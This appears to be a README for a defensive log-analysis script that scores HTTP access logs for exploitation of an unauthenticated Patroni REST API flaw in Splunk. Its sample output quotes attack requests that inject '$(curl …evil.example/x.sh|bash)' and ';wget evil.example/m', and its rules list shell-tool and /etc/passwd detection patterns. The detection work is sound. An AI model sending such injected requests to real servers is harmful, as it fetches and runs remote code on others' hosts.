# PatroniWatch · 针对 CVE-2026-76268 的日志检测小 Agent

`rain.op` 每日安全小 Agent 系列的第 9 个：**流量监测**方向。

**背景**：2026-10-07 披露的 Splunk Enterprise 严重漏洞
**CVE-2026-76268**（CVSS 9.8，安全公告 SVD-2026-1001）——搜索头集群成员的
Patroni REST API 缺少身份认证（CWE-306）：能访问到该 API 的网络位置即可
**无需账号**调用集群配置操作，篡改集群配置并在宿主机执行任意命令。
影响版本：10.4 分支 < 10.4.3、10.2 分支 < 10.2.7（10.0.x / 9.4.x 不受影响）。

PatroniWatch 读取 Splunk / 反向代理的 HTTP 访问日志（Apache / Nginx Combined
格式），按客户端 IP 聚合，用 **4 组启发式规则**揪出针对 Patroni REST API 的
探测与利用行为，输出 0–100 风险评分、命中规则与证据链。

## 检测逻辑

| 规则 | 权重 | 例子 |
|---|---|---|
| R1 未认证配置变更 | 40 | `POST /patroni/config`、`PUT /patroni/switchover`、`DELETE /patroni/pause` |
| R2 API 路径探测 | 20 | 60 秒窗口内探测 ≥5 个敏感 API 路径（`/patroni`、`/cluster`、`/switchover`、`/restart`、`/reload`、`/failover`、`/reinitialize`、`/pause`、`/resume`、`/sync`、`/leader` 等） |
| R3 命令注入特征 | 35 | `;`、`|`、`$()`、反引号、`curl`/`wget`、`nc`、`bash`、`whoami`、`/etc/passwd`（含两轮 URL 解码） |
| R4 扫描器指纹 | 10 | sqlmap / nmap / masscan / gobuster 等 UA，或 curl / wget 等命令行工具 UA、缺失 UA |

评分 0–100：**≥70 高危，≥40 可疑**，其余有命中但未达阈值的进「观察」。
评分 = 规则权重和 + 攻击类型多样性加成（最多 +15）
+ 配置变更返回 2xx 的「疑似成功」加成（+10）。

## 目录结构

```
agents/09-patroniwatch/
├── patroniwatch.py # 主程序：解析 → 规则匹配 → 按 IP 聚合打分 → 报告
├── requirements.txt # 纯标准库，无第三方依赖
└── README.md # 本文件
```

## 怎么跑

```bash
# 演示模式：内置正常流量 + 侦察型攻击者 + 利用型攻击者（CVE-2026-76268 场景）
python patroniwatch.py --demo

# 分析本地日志（Combined 格式）
python patroniwatch.py --file /var/log/nginx/access.log

# 管道输入（可接 Splunk / 反代日志）
tail -f /var/log/nginx/access.log | python patroniwatch.py

# 告警结果另存为 JSON
python patroniwatch.py --demo --json /tmp/alerts.json
```

需要 Python 3.8+，无第三方依赖。

## 示例输出

```
$ python patroniwatch.py --demo
共解析 44 条访问日志
共解析 IP 24 个，其中告警 1 个、观察 1 个

客户端IP 评分 等级 命中规则
----------------------------------------------------------------------
198.51.100.23 100 高危 未认证配置变更、命令注入特征、扫描器指纹

有命中但未达告警阈值：
203.0.113.7 评分 35 API 路径探测、扫描器指纹

[198.51.100.23] 评分 100（高危），配置变更疑似成功 ⚠
- R1 未认证配置变更: POST/PUT/DELETE 打向集群配置类 REST 端点（Patroni API 缺认证，CWE-306）
例: 198.51.100.23 - - [13/Oct/2026:08:12:40 +0800] "POST /patroni/config HTTP/1.1" 200 1234 "-" "curl/8.0.1"
例: 198.51.100.23 - - [13/Oct/2026:08:12:45 +0800] "PUT /patroni/switchover?cmd=$(curl%20http://evil.example/x.sh|bash) HTTP
例: 198.51.100.23 - - [13/Oct/2026:08:12:50 +0800] "POST /patroni/restart?arg=;wget%20http://evil.example/m HTTP/1.1" 200 12
- R3 命令注入特征: 请求中出现 shell 命令特征（; | $() 反引号 curl/wget 等）
例: 198.51.100.23 - - [13/Oct/2026:08:12:45 +0800] "PUT /patroni/switchover?cmd=$(curl%20http://evil.example/x.sh|bash) HTTP
例: 198.51.100.23 - - [13/Oct/2026:08:12:50 +0800] "POST /patroni/restart?arg=;wget%20http://evil.example/m HTTP/1.1" 200 12
```

- `198.51.100.23`：直接利用 CVE-2026-76268——未认证 POST/PUT 配置变更 +
命令注入载荷（`$(curl …|bash)`、`;wget …`）且返回 200 → 100 分高危。
- `203.0.113.7`：45 秒内 GET 探测 9 个敏感 API 路径（`/patroni`、`/cluster`、
`/switchover`、`/failover`、`/restart`…），curl UA → 35 分，观察级。
- 30 条正常 Splunk 管理流量：无误报。

## 局限

- 启发式规则，依赖日志里能看到请求方法和完整 URL；若反代只记了状态码
而不记 URL，R1/R3 会失效。
- 日志本身看不到认证头，R1 按「变更方法 + 敏感端点」判定；若内网有
合法自动化脚本调用这些端点，需要加白名单。
